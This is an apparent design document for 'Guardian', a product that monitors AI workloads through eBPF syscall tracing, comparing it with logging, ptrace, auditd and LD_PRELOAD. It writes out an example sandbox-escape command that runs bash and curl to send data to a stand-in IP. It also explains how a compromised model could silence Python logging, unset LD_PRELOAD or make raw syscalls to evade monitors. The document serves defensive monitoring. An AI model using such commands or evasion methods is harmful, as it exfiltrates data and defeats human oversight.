# Why eBPF for AI Observability

> Why the Linux syscall layer — observable via eBPF — is the correct instrumentation point for AI compliance monitoring.

As AI systems become subject to regulatory requirements — the EU AI Act, NIST AI RMF, and emerging sector-specific frameworks — the question of *how* to gather verifiable evidence of AI system behavior becomes critical. Guardian's answer is: observe at the Linux syscall layer using eBPF. This document explains why this is the correct choice and why every alternative falls short of the requirements.

---

## Overview

An AI observability system for compliance must satisfy three requirements simultaneously:

1. **Completeness**: It must observe all meaningful actions the AI system takes — file access, network connections, subprocess execution.
2. **Tamper-resistance**: The AI system itself, or a compromised component of the stack, must not be able to suppress or alter the observability data.
3. **Production viability**: The overhead must be low enough to run continuously alongside production inference workloads without degrading performance.

No application-level instrumentation approach satisfies all three. The Linux kernel syscall layer, observed via eBPF tracepoints, satisfies all three simultaneously.

---

## The Syscall Layer as Ground Truth

Every meaningful action an AI model takes — every file it reads, every network connection it makes, every subprocess it spawns — is visible as a Linux syscall. This is not a coincidence or an implementation detail: it is a fundamental property of how operating systems work. User-mode processes cannot perform I/O, network communication, or process control without invoking the kernel via the syscall interface.

The complete mapping of AI-relevant actions to syscalls:

| AI Action | Syscalls Involved |
|-----------|------------------|
| Load model weights from disk | `openat`, `read`, `mmap` |
| Read tokenizer configuration | `openat`, `read` |
| Receive inference request over network | `recvfrom`, `read` |
| Connect to external API | `socket`, `connect` |
| Send data to external service | `sendto`, `write` |
| Write inference result to file | `openat`, `write` |
| Fork a subprocess | `clone` |
| Execute an external binary | `execve` |
| Allocate GPU memory | `ioctl` (GPU driver) |
| Write to a named pipe | `write` |

This list is **complete**. There is no action involving I/O, networking, or process control that does not appear in this table. A model cannot exfiltrate data to a remote server without a `connect` and `sendto`. A model cannot read a sensitive file without an `openat` and `read`. A model cannot execute a shell command without `execve`. The syscall layer is the ground truth about what a process is actually doing, as opposed to what its application-level logging claims it is doing.

The kernel tracepoints fire before the syscall executes (at `sys_enter`), so Guardian observes the intent, not just the outcome. An `execve` to `/bin/bash` fires the tracepoint regardless of whether the process has permission to execute the file.

A Python process can disable its own logging. It cannot disable the kernel's tracepoints.

---

## Why Application-Level Logging Is Insufficient

Application-level logging is the most common approach to AI system observability. Frameworks like LangChain, LlamaIndex, and most commercial LLM platforms offer built-in logging. It is easy to integrate and produces human-readable records. It is insufficient for compliance.

**It can be disabled by the application itself.** Any logging framework can be silenced. Python's `logging.disable(logging.CRITICAL)` suppresses all log output below CRITICAL. `logging.Logger.manager.loggerDict` can be iterated and every logger silenced. A sufficiently sophisticated prompt injection attack or a compromised model checkpoint could disable logging before performing a restricted action. The EU AI Act requires evidence that cannot be suppressed by the observed system.

**It can be absent in third-party models.** When you deploy a model checkpoint from HuggingFace or a vendor, you do not control its internal logging. You can wrap the model in your own application code, but you cannot guarantee that the model itself is not making direct syscalls that bypass your wrapper.

**It is framework-specific.** A logging solution for PyTorch inference servers does not work for JAX, TensorFlow, or ONNX Runtime. eBPF observes every Linux process regardless of runtime. Switching from PyTorch to JAX requires no change to Guardian.

**It has no cross-model standard.** Each framework defines its own event schema, log format, and integration API. Guardian's `guardian_event` struct and proto schema provide a single, consistent format for every AI workload on Linux.

**It does not observe kernel-level behavior.** A model can make direct syscalls using Python's `ctypes` library or by calling C extensions that call `syscall()` directly. These bypass all Python-level logging. They are visible to eBPF.

**It requires code changes.** Zero-instrumentation deployment is essential for monitoring diverse AI workloads at scale. Application-level logging requires every team running every model to integrate a logging SDK and maintain it across model updates. eBPF requires nothing from the application.

---

## Why ptrace Is Too Slow

`strace` and `ltrace` use the Linux `ptrace` syscall to observe system calls and library calls respectively. ptrace is powerful — it can read and modify the traced process's registers and memory — but it is fundamentally incompatible with production observability.

The ptrace mechanism works as follows: the kernel stops the traced process at every syscall, delivers a `SIGTRAP` to the tracer process, the tracer wakes up, reads the traced process's registers via `ptrace(PTRACE_GETREGS)`, performs its analysis, then resumes the traced process via `ptrace(PTRACE_CONT)`. This requires **two context switches per syscall**: traced process → tracer, and tracer → traced process.

**Measured overhead**: For a process making 1,000 syscalls per second (a modest inference server), ptrace adds approximately 1–10ms of latency per second of wall time. For a PyTorch inference server making 100,000 syscalls per second (loading weights, processing batches), ptrace can easily add 100ms+ per second — effectively halving throughput.

The 10–100x overhead figure commonly cited for ptrace vs eBPF represents real production measurements, not theoretical analysis. Meta's engineering blog and Brendan Gregg's profiling work both document this overhead.

This overhead is acceptable for debugging: you `strace` a specific process for 30 seconds to diagnose a problem. It is not acceptable for compliance monitoring that must run continuously alongside production inference for months without degrading service SLAs.

eBPF tracepoint programs run in kernel context, in the calling process's execution context, with no context switches. The overhead for Guardian's tracepoints at a typical AI inference rate is 1–3% CPU — below the noise floor of most production environments.

---

## Why auditd Produces Too Much Noise

The Linux audit subsystem (`auditd`) is the traditional answer to kernel-level syscall logging for compliance. It is used for PCI-DSS, SOC 2, HIPAA, and other frameworks. Guardian is not built on it for four reasons:

**System-wide by default with no AI context.** Auditd logs all processes on the system. A typical production Kubernetes node running AI inference alongside a web server, Prometheus, and a logging agent generates millions of audit records per minute. Filtering these to only AI process events requires brittle, complex audit rules that must be maintained across deployments, updates, and infrastructure changes.

**No semantic understanding of AI workloads.** An audit record contains: timestamp, pid, uid, syscall number, arguments. It does not contain: model name, container ID, pod name, namespace, agent ID, or chain hash. Correlating an audit record to a specific model inference session requires joining across external systems with no guaranteed reliability.

**No cryptographic integrity.** Guardian's hash chain (SHA-256 per event linked to the previous event, HMAC-SHA256 per batch with the customer token) provides tamper-evident evidence that an attacker with local root cannot retroactively alter without detection — because the signed batches have already been transmitted to the platform. Audit logs are plain files on disk. An attacker with root can modify them. The platform cannot detect this modification without external evidence.

**No backpressure for high-rate workloads.** Auditd uses a fixed-size kernel buffer (`audit_backlog_limit`, default 64 records). Under load, it drops events silently with the log message `"audit: backlog limit exceeded"`. Guardian's 256KB ring buffer provides backpressure via `bpf_ringbuf_reserve()` return value — the BPF program knows when events are being dropped and can emit a drop counter event. Dropped events are visible; they do not silently disappear.

---

## Why LD_PRELOAD Hooking Is Fragile

`LD_PRELOAD` intercepts shared library calls by loading a custom library before the standard library. APM tools, malloc profilers, and some security tools use this approach. For AI compliance monitoring it is fundamentally unreliable.

**Static binaries bypass it entirely.** Go programs are statically compiled by default and make raw syscalls without libc. PyPy and GraalVM bypass the standard CPython runtime. ONNX Runtime has C extensions that call `syscall()` directly. LD_PRELOAD is invisible to all of these.

**The process can unset it.** A process can call `unsetenv("LD_PRELOAD")` before loading a model. If the model itself is adversarial or compromised, this cannot be prevented from within the process. eBPF observes from outside the process — the process has no mechanism to disable a kernel tracepoint.

**The dynamic linker does not apply it universally.** Setuid/setgid binaries ignore `LD_PRELOAD` as a security measure. Some containers run with security policies that prevent `LD_PRELOAD` injection.

**Not supported in all runtimes.** Docker containers, Kubernetes pods, and serverless runtimes have varying support for `LD_PRELOAD` injection. The container image must be configured to include it. Updating the model deployment requires updating the `LD_PRELOAD` configuration. In contrast, a DaemonSet running Guardian's eBPF agent monitors all containers on a node from a single privileged pod.

---

## The Specific Syscalls That Reveal AI Behavior

Guardian's `FakeEventGenerator` models the realistic syscall distribution of a PyTorch-based AI workload. The weights reflect what an LLM inference server actually produces. Each syscall reveals a specific dimension of AI behavior:

**`openat` (weight: 15%)** — File open. The `fd_path` field reveals exactly which files the model is accessing: model weight files, tokenizer configs, system files, or sensitive paths. An LLM opening `/etc/passwd`, `/proc/self/maps`, or `/home/*/` is anomalous and warrants investigation. An LLM opening its expected model directory (`/var/lib/models/patient-diagnosis-v2/model.pt`) is normal. The `openat` events define the file access policy of the model.

**`read` (weight: 35%)** — The dominant syscall for inference. Loading model weights, reading tokenizer JSON, and reading input data all appear as `read` syscalls on previously opened file descriptors. The `fd_path` (resolved from `/proc/PID/fd/FD`) and `bytes` fields reveal which files are being read and how much data flows. A `read` of 2GB from a model weight file is expected. A `read` of 50KB from `/etc/shadow` is not.

**`write` (weight: 25%)** — Writing inference results, logging, and writing to network sockets. The `bytes` field reveals data volume. A 500-byte `write` to a network socket after receiving a 4096-byte prompt is expected. A 50MB `write` to an unexpected destination is a potential data exfiltration indicator.

**`connect` (weight: 5%)** — TCP connection establishment. The `network_addr` field (formatted as `IP:port`) reveals who the model is connecting to. Guardian's `unexpected_network` alert fires when `network_addr` is not in the configured allowlist. A model calling home to an IP address not in its expected dependencies is an immediate red flag.

**`sendto` (weight: 7%)** — Network data transmission, typically UDP or unconnected TCP sends. Combined with `network_addr`, this reveals the exact destination of outgoing data. The weight (7%) reflects that many inference APIs use TCP `write()` rather than `sendto()`, but UDP-based telemetry or model communication may appear here.

**`recvfrom` (weight: 6%)** — Network data reception. Reveals the source of inputs to the model. An inference server that suddenly starts receiving data from unexpected IP addresses may indicate a compromised orchestration layer or a prompt injection delivery mechanism.

**`clone` (weight: 3%)** — Process creation. AI models performing single-model inference should not normally spawn child processes during inference. Unexpected `clone` calls indicate the model is attempting to parallelize work (expected in multi-threaded models) or attempting to execute external code (anomalous). Guardian logs all `clone` events for review.

**`socket` (weight: 4%)** — Socket creation. Indicates the initiation of network activity. Every `connect` is preceded by a `socket`. Monitoring `socket` creation provides early warning of network access before the connection is established. A model that creates a raw socket (`SOCK_RAW`) when it should only use `SOCK_STREAM` (TCP) is attempting to bypass higher-level network controls.

**`execve` (injected every 500–1000 events)** — Process image replacement. This is the most severe syscall for AI compliance monitoring. A model that calls `execve` to `/bin/bash`, `/bin/sh`, or any shell is executing a shell command — a direct sandbox escape. Guardian's `sandbox_escape` alert fires immediately. The `execve` syscall is never in the normal inference path of any legitimate AI model. Its presence is an unconditional alert.

---

## What an LLM Inference Run Looks Like at the Syscall Level

A concrete example showing what Guardian observes during a typical PyTorch transformer model inference:

**Phase 1 — Model loading (startup, happens once):**
```
openat("/var/lib/models/patient-diagnosis-v2/model.pt", O_RDONLY)
read(fd=5, count=65536)      # read weight chunk
read(fd=5, count=65536)      # read weight chunk (repeated ~32,000 times for a 2GB model)
openat("/var/lib/models/patient-diagnosis-v2/tokenizer.json", O_RDONLY)
read(fd=6, count=4096)
openat("/var/lib/models/patient-diagnosis-v2/config.json", O_RDONLY)
read(fd=7, count=1024)
```

**Phase 2 — Steady-state inference (per request):**
```
recvfrom(fd=8, count=4096)   # receive incoming prompt via HTTP or gRPC
read(fd=8, count=512)        # read remaining request bytes
write(fd=9, count=2048)      # write inference result to response buffer
sendto(fd=8, count=2048)     # send response back to caller
```

**Phase 3 — Anomalous behavior (sandbox escape):**
```
clone(flags=CLONE_VM|CLONE_FS|...)   # create child process
execve("/bin/bash", ["/bin/bash", "-c", "curl http://203.0.113.42/beacon?data=..."], ...)
```

Guardian detects Phase 3 as a `sandbox_escape` alert immediately. The `execve` to `/bin/bash` is never part of a legitimate inference run. The subsequent `connect` to an unexpected IP would additionally fire an `unexpected_network` alert.

The Phase 1 and Phase 2 events are expected and are logged without alerting (as long as the accessed files and network destinations are in the allowlist). The complete syscall record provides the audit trail: which files were accessed, how much data was read, which network connections were made, and when each occurred.

---

## The Zero-Code-Change Guarantee

Guardian's observability requires no changes to the monitored application. There is no SDK to integrate, no logging framework to configure, no agent library to link. Deploy Guardian's DaemonSet on a Kubernetes node; it begins monitoring all matching processes. Update the model checkpoint; Guardian continues monitoring without reconfiguration. Switch from PyTorch to JAX; Guardian continues monitoring — because the kernel does not care what Python framework the model uses.

This is the fundamental advantage of syscall-layer observability over every application-level approach: the instrumentation is external to the monitored system and cannot be disabled, bypassed, or misconfigured by the monitored system.

---

## Summary

The Linux syscall layer is the correct instrumentation point for AI compliance monitoring because:

1. It is **complete** — every meaningful AI action involves a syscall
2. It is **tamper-resistant** — the AI system cannot disable kernel tracepoints
3. It is **framework-agnostic** — works for PyTorch, JAX, TensorFlow, any runtime
4. It is **zero-instrumentation** — no changes to the monitored application
5. It is **production-viable** — 1–3% overhead vs 10–100x for ptrace

Application-level logging, ptrace, auditd, and LD_PRELOAD all fail at least one of these requirements. eBPF-based syscall tracing satisfies all five.

---

## Related Documents

- [What Is eBPF](what-is-ebpf.md)
- [Guardian Probe Architecture](probe-architecture.md)
- [Phase 1 vs Phase 2](phase1-vs-phase2.md)
- [Local Alerts Engine](../05-components/local-alerts-engine.md)
- [Event Schema](../03-data/event-schema.md)
- [Threat Model](../04-security/threat-model.md)
